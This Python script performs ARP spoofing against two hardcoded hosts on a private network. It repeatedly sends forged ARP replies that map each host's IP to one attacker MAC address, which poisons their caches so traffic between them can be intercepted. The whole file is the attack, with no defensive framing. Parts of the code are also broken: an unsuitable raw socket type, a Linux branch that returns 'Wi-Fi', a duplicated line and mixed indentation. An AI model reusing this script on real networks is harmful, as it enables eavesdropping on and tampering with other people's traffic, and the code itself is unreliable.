import socket
import struct
import platform

def get_interface():
    system = platform.system()
    if system == "Windows":
        # On Windows, use the default interface
        return socket.gethostbyname(socket.gethostname())
    elif system == "Linux":
        # On Linux, specify the interface name (e.g., "enp0s8")
        return "Wi-Fi"  # Change this to your desired interface
    else:
        raise Exception("Unsupported operating system")

def send_arp_reply(interface, source_ip, source_mac, target_ip, target_mac):
    # Create a raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    if platform.system() == "Linux":
        # On Linux, binding to a specific interface is required
        s.bind((interface, 0))

    # Craft the ARP reply packet
    ethernet_header = struct.pack("!6s6sH", target_mac, source_mac, 0x0806)
    arp_header = struct.pack("!HHBBH6s4s6s4s",
                             0x0001, 0x0800, 6, 4,
                             2, source_mac,
                             socket.inet_aton(source_ip),
                             target_mac,
                             socket.inet_aton(target_ip))

    # Concatenate the headers to form the complete ARP reply packet
    packet = ethernet_header + arp_header

    # Send the packet
    s.send(packet)


if __name__ == "__main__":
    # Specify the network interface
    interface = get_interface()

    # Specify the IP addresses
    source_ip1 = "10.134.254.56"
    source_ip2 = "10.134.253.72"
    
    # Example MAC address X (\x08\x00\x27\xAA\x76\xDB) (\x08\x00\x27\x25\xf9\x4D)
    source_mac = b'\x08\x00\x27\xAA\x76\xDB'
    source_mac = b'\x08\x00\x27\xAA\x76\xDB'   
    
    # Address of the target
    target_ip1 = "10.134.253.72"
    target_mac1 = b'\x98\x43\xfa\x32\xd9\xda'  
    
    target_ip2 = "10.134.254.56"
    target_mac2 = b'\x90\x0f\x0c\xe6\x5e\x27'  

    # Send the ARP reply packet
    while True:
    	send_arp_reply(interface, source_ip1, source_mac, target_ip1, target_mac1)
    	send_arp_reply(interface, source_ip2, source_mac, target_ip2, target_mac2)
